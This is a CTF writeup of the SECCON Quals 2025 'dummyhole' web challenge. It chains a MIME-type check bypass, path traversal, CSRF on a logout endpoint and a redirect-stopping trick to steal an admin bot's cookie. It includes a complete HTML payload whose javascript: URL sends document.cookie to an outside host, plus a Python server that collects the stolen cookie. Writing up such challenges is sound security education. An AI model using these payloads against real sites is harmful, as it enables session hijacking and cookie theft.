---
title: SECCON Quals 2025 - dummyhole - 15 solves
published: true
category: web
tags: [xss, csrf, path-traversal]
difficulty: medium
seo_description: "SECCON CTF Quals 2025 dummyhole web challenge writeup. Path traversal, MIME type bypass with image/png+json, CSRF exploit, and credentialless iframe bypass to steal cookies."
seo_keywords:
  - SECCON CTF 2025
  - SECCON Quals 2025
  - dummyhole writeup
  - CTF writeup
  - web security
  - path traversal exploit
  - CSRF attack
  - XSS cookie stealing
  - credentialless iframe bypass
  - MIME type bypass
  - image/png+json
  - JavaScript import assertion
  - RyotaK challenge
  - browser security bypass
---

# dummyhole - web

_author: RyotaK_

- Challenge description:

> Is this a hole or...?
>
> Challenge: http://dummyhole.seccon.games
> Admin bot: http://dummyhole.seccon.games:1337

- Number of solves: `15`
- Points: `233`

attachments:

- [dummyhole.tar.gz](https://github.com/tomek7667/hacker-blog/raw/master/challenge_files/dummyhole.tar.gz)

## tl;dr

couple of interesting exploits chained:

- `image/jpeg+json` / `image/png+json` allowed as they are checked with just `.startsWith('image/png')` function. These mime types are actual mime types supported by the `rustfs` service used for file storage. From [mime-type site](https://mime-type.com/image/png+json/) we can see that [pixel art website](https://www.piskelapp.com/p/create/sprite/)'s `.piskel` extension is associated with that. In practice, the body is basically a valid json.
- in result, when we go to a `/posts/?id=../../images/<id>` it requests:

```js
const params = new URLSearchParams(location.search);
const postId = params.get("id");
// ...
const postData = await import(`/api/posts/${postId}`, {
	with: { type: "json" },
});
// which becomes:
const postData = await import(`/api/posts/../../images/<id>`, {
	with: { type: "json" },
});
// which becomes:
const postData = await import(`/images/<id>`, { with: { type: "json" } });
```

which retrieves the file from `rustfs` and sets the content-type header to be `ContentType` of the s3 client response, so we fully control the `postData` object, which is used later on:

```js
document.getElementById("title").textContent = postData.default.title;
document.getElementById("description").textContent =
	postData.default.description;
const imageUrl = `${location.origin}${postData.default.image_url}`;
document.getElementById("imageFrame").src = imageUrl; // !
```

So we will supply the bot instead of raw, post id, just `../../images/<image as json id>`.

- as we know, the bot visits `http://web`, so the image url becomes essentially:

```js
const imageUrl = `http://web${postData.default.image_url}`;
document.getElementById("imageFrame").src = imageUrl;
```

and we fully control the `postData` object, so what that means in practice, is that we can fully control what will be displayed in `<iframe id="imageFrame" credentialless></iframe>` as long as the endpoint we control starts with `web` and is in `http`.

If you control a domain, you can set up a subdomain `web` and you're good to go, however there's a free, very interesting alternative. Specifically [webhook.site](https://webhook.site/) which is a free service to capture requests done to your specific link.

- The iframe is has attribute `credentialless`, which means `It doesn't have access to its regular origin's network, cookies, and storage data` as [mdn docs states](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/IFrame_credentialless). That's a bump in a road, but overcomable with a csrf on `POST /logout` which we can use to our advantage. The logout.html contains a script that either instantly redirects:

```js
const postId = decodeURIComponent("<POST_ID>");
location.href = postId ? `/posts/?id=${postId}` : "/";
```

or redirects after 5 seconds to fallback url which is much more flexible:

```js
const fallbackUrl = decodeURIComponent("<FALLBACK_URL>");
if (!fallbackUrl) {
	location.href = "/";
	return;
}
location.href = fallbackUrl;
```

So the job here is to prevent the first redirection in order to, e.g. have

```
javascript:location='http://web.cyber-man.pl:1337/?flag='+encodeURIComponent(document.cookie)
```

as the fallback url. The endpoint showing the above `logout.html` and actually supplying the values in brackets is replacing them with raw strings supplied by the request body:

```js
app.post("/logout", requireAuth, (req, res) => {
	const sessionId = req.cookies.session;
	sessions.delete(sessionId);
	res.clearCookie("session");

	const post_id = req.body.post_id?.length <= 128 ? req.body.post_id : "";
	const fallback_url =
		req.body.fallback_url?.length <= 128 ? req.body.fallback_url : "";

	const logoutPage = path.join(__dirname, "public", "logout.html");
	const logoutPageContent = fs
		.readFileSync(logoutPage, "utf-8") // here it's a string
		.replace("<POST_ID>", encodeURIComponent(post_id)) // here we replace the `<POST_ID>` with req.body.post_id
		.replace("<FALLBACK_URL>", encodeURIComponent(fallback_url)); // and here the `<FALLBACK_URL>` with req.body.fallback_url

	res.send(logoutPageContent);
});
```

so that's how we control the values. In order to stop the redirection, there are several ways to do it like:

- adding `<\t` at the end of the url _(explanation why that works can be found in [critical thinking bug bounty podcast blog post](https://lab.ctbb.show/research/stopping-redirects#control-of-url))_ - I found this to be the easiest and most convenient way
- uploading very large images and then opening them just before submitting the csrf form _(browser loads them longer than 5 seconds)_
- abusing connection pool of the browser _([xsleak's post](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) has a details information on how to do it)_

So the payload that we should finally serve under the iframe.src might be:

```html
<!DOCTYPE html>
<html>
	<body>
		<form id="f" method="POST" action="http://web/logout" target="_top">
			<textarea name="post_id" id="txtarea">&#9;&lt;</textarea>
			<input
				name="fallback_url"
				value="javascript:location='http://web.cyber-man.pl:1337/?flag='+encodeURIComponent(document.cookie)"
			/>
		</form>
		<script>
			document.getElementById("f").submit();
		</script>
	</body>
</html>
```

_(`&#9;` is the tab html character, but `&Tab;&lt;` should work too.)_

## The Challenge

After signing to the service, we are greeted with an upload image form with title and description options:

![upload image form](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/upload-image.webp)

After submitting, we are redirected to `/posts?id=<uuid>` and we can see our just uploaded post:

![newly created post](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/newly-created-post.webp)

Getting such quick recon out of the way, let's check the code to find ourselves the flag!

After searching for `FLAG` across the uncompressed task files, we can see the flag is in a bot's cookie, with `domain` set to `http://web` which is directing it to the service screenshots present. When we inspect what we can supply to the bot, the only check performed on our payload is whether the `id` is string:

```js
if (typeof id !== 'string') {
```

so we don't have to provide exactly a uuid, it just must be a string. After setting the cookie and logging in, the bot goes to posts site with `?id=` set to our any string payload, which already hints at **path traversal** vulnerability:

```js
await page.goto(`${APP_URL}/posts/?id=${encodeURIComponent(id)}`, {
	timeout: 10_000,
});
```

The server responsible for `/posts/` endpoint, only returns the contents of the `post.html` file to the authenticated users, so the frontend is responsible for handling the actual post loading, and it does that by getting the post id from the provided `id=<our string>` and calling and import on backend route that must return `json` data:

```js
const postData = await import(`/api/posts/${postId}`, {
	with: { type: "json" },
});
```

When we look into what the `/api/posts/:id` returns, we can see that the `image_url` submitted via the `/upload` endpoint is not controlled by us. So we need another approach we foreshadowed earlier: **path traversal**. We can see on `/images/:id` route that it returns contents of the file in the `rustfs` service with `content-type` header set to the contents `ContentType`. That would mean, that if we manage to put a file in the storage that has `response.ContentType` set to `application/json`, we could use the path traversal to **fully control the `postData`** variable by just supplying the bot with `../../images/<file id>`:

```js
app.get("/images/:id", async (req, res) => {
	// ...
	res.setHeader(
		"Content-Type",
		response.ContentType || "application/octet-stream"
	);
	// ...
	stream.pipe(res);
	// ...
});
```

If we look on how the files are uploaded to the `rustfs` service on the `POST /upload` request, there's a check on the file's mimetype that it must start with either `image/png` or `image/jpeg`:

```js
// ...
if (
	!file.mimetype ||
	(!file.mimetype.startsWith("image/png") &&
		!file.mimetype.startsWith("image/jpeg"))
) {
	return res.status(400).json({ error: "Invalid file: must be png or jpeg" });
}
// ...
```

That's unusual, because when we try to look for some common media types in [mozilla's developer docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types/Common_types), we can see, that a rather strict equality to `image/png` should be more suitable. That leads us to hunt if there are any mimetypes that starts with `image/png` but are a proper `json` instead. So actually [`piskel`](https://www.piskelapp.com/p/create/sprite/) file format is all json inside, and is associated with `image/png+json` mimetype! Let's try that:

![upload json](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/upload-json.webp)

It worked! Our `{}` file is now stored on the server and available under the id `1e6baaa6-...`. Now that we control the `postData` in `post.html`, we can take a look, what kind of powers it gives us.

```html
<div class="post-container">
	<h1 id="title">Loading...</h1>
	<div class="description" id="description"></div>
	<iframe id="imageFrame" credentialless></iframe>
</div>
```

```js
const postData = await import(`/api/posts/${postId}`, {
	with: { type: "json" },
});

document.getElementById("title").textContent = postData.default.title;
document.getElementById("description").textContent =
	postData.default.description;

const imageUrl = `${location.origin}${postData.default.image_url}`;
document.getElementById("imageFrame").src = imageUrl;
```

so we can essentially control the source of `credentialless` iframe provided that it starts with `location.origin` which in our target's _(bot)_ case, will be `http://web`. We can achieve that by either using [webhook.site](https://webhook.site/), or by having our own domain set up to have a `web` subdomain / prefix. As the body of the image, we then provide any title/description, and the image_url, with the cut-off `http://web` prefix:

```json
{
	"title": "123",
	"description": "456",
	"image_url": ".cyber-man.pl/hook" // will become `http://web.cyber-man.pl/hook` from the bot's point of view.
}
```

The next step, is going to find out how does an iframe help us in getting the flag, because the cookie is set to be specifically for `"web"` which is valid docker domain:

```js
await context.setCookie({
	name: "FLAG",
	value: FLAG,
	domain: "web",
	path: "/",
});
```

and the iframe that is not of the same origin can't access this cookie:

![video showcasing how iframes of different origin don't share cookies](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/cookie-sharing-showcase.mp4)

So how can we obtain this seemingly unobtainable cookie? With the use of [CSRF!](https://portswigger.net/web-security/csrf) Ours can be found in the `POST /logout` action:

```js
// ...
const logoutPage = path.join(__dirname, "public", "logout.html");
const logoutPageContent = fs
	.readFileSync(logoutPage, "utf-8")
	.replace("<POST_ID>", encodeURIComponent(post_id))
	.replace("<FALLBACK_URL>", encodeURIComponent(fallback_url));

res.send(logoutPageContent);
// ...
```

the `post_id` and `fallback_url` come from req.body, so if we set the webhook body _(that is in the iframe)_ to contain a form with a `POST` action for `http://web/logout`, we can make the bot call the logout with parameters set by us:

```html
<form id="f" method="POST" action="http://web/logout" target="_top">
	<textarea name="post_id" id="txtarea">...</textarea>
	<input name="fallback_url" value="..." />
</form>
```

But how does exactly `fallback_url` be used? Let's see the actual `logout.html` page, because we might find ourselves an obstacle to overcome:

```js
// ...
setTimeout(() => {
	const fallbackUrl = decodeURIComponent("<FALLBACK_URL>");
	if (!fallbackUrl) {
		location.href = "/";
		return;
	}
	location.href = fallbackUrl;
}, 5000);
const postId = decodeURIComponent("<POST_ID>");
location.href = postId ? `/posts/?id=${postId}` : "/";
// ...
```

As you can see, the fallback url is only used, if the redirection at the bottom either fails or stalls for 5 seconds. So we need to make it either, and our `fallback_url` with malicious javascript will be executed. Here's an example of how we could utilize the `location.href` assignment from out javascript:

```html
<input
	name="fallback_url"
	value="javascript:location='http://web.cyber-man.pl:1337/?flag='+encodeURIComponent(document.cookie)"
/>
```

In order to stop the redirection, there are several ways to do it like:

- adding `<\t` at the end of the url _(explanation why that works can be found in [critical thinking bug bounty podcast blog post](https://lab.ctbb.show/research/stopping-redirects#control-of-url))_ - I found this to be the easiest and most convenient way
- uploading very large images and then opening them just before submitting the csrf form _(browser loads them longer than 5 seconds)_
- abusing connection pool of the browser _([xsleak's post](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) has a details information on how to do it)_

so the `post_id` param will include HTML encoded characters of `\t` and `<`, that will stop the redirection.

```html
<textarea name="post_id" id="txtarea">&#9;&lt;</textarea>
```

## Actually getting the flag

If you'd like to use an own server, I created a simple python webserver, that just serves the payload _(The logging of requests happen automatically)_:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        print(self.path)
        self.wfile.write(open("./payload.html", "rb").read())

if __name__ == "__main__":
    webServer = HTTPServer(("0.0.0.0", 1337), MyServer)
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
```

`payload.html` :

```html
<!DOCTYPE html>
<html>
	<body>
		<form id="f" method="POST" action="http://web/logout" target="_top">
			<textarea name="post_id" id="txtarea">&#9;&lt;</textarea>
			<input
				name="fallback_url"
				value="javascript:location='http://web.<YOUR DOMAIN>:1337/?flag='+encodeURIComponent(document.cookie)"
			/>
		</form>
		<script>
			document.getElementById("f").submit();
		</script>
	</body>
</html>
```

So to finally exploit the server, we'd need to setup our webhook server, create a post with image data content-type set to `image/png+json` and value of the image with malicious `imageUrl`:

```json
{
	"title": "123",
	"description": "456",
	"image_url": ".cyber-man.pl:1337"
}
```

You can do it easily in burp by firstly submitting a small legit PNG, removing the raw bytes from PNG header until the `---WebKitForm...`, pasting your json and adding at the end of the `Content-Type` the `+json`:

![showcase of easy submit of malicious json](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/malicious-upload.webp)

After doing that, grab the `id` from the response in order to get to know your image url. You should have that request in your `Proxy -> HTTP History` tab, as you created an example post:

![showcase of getting the image url](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/malicious-image-id.webp)

And just to make sure, we can `GET /images/9931e2c0-bd76-472c-89b8-9f2f114b5838` to see that it truly returns our json:

![showcase that the 'image' is actually our json payload](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/malicious-image.webp)

That's all we need, now we can just submit it to the bot with the path traversal vulnearability discovered earlier:

```
../../images/9931e2c0-bd76-472c-89b8-9f2f114b5838
```

![showcase of bot submission](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/actual-bot-submission.webp)

Now we can observe the logs of our payload serving webhook and after a while, the flag will pop up:

![showcase of getting the actual flag](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/actual-flag.webp)

```
SECCON{why_c4nt_we_eat_the_d0nut_h0le}
```

## afterthoughts

I was a bit surprised that the challenge got 15 solves, as I think it was quite complex, although each of the vulnerability singled out were quite simple, the whole chain is what made it difficult. Overall it was a fun challenge and I hope I see more quality challs from SECCON after finals challenges and in the future year!

My quality+difficulty rating for this challenge is: `8/10`

:)

_Please note that if you host from your computer, you might need to enable port forwarding on your router on port 1337 to your computer local ip address `ipconfig` in terminal. Then point your web.\* domain to your ip: https://checkip.amazonaws.com/_
